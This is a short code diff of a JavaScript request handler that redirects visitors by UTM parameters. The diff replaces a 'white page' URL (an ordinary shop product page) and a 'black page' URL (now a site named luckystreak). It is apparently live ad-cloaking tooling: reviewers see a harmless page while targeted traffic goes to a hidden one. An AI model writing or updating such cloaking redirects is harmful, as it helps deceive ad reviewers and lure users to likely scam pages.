@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.relaxsit.com.pk/collections/laptop-tables/products/foldable-bed-table-floor-table-drawing-desk-portable-laptop-bed-computer-table-couch-size-40-x-60-cm";
-    const blackPageURL = "https://mohsinsiraj.lovable.app/";
+    const whitePageURL = "https://aodour.pk/products/elegant-luxe-waterproof-quartz-watch-for-women";
+    const blackPageURL = "https://luckystreak.lovable.app/";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
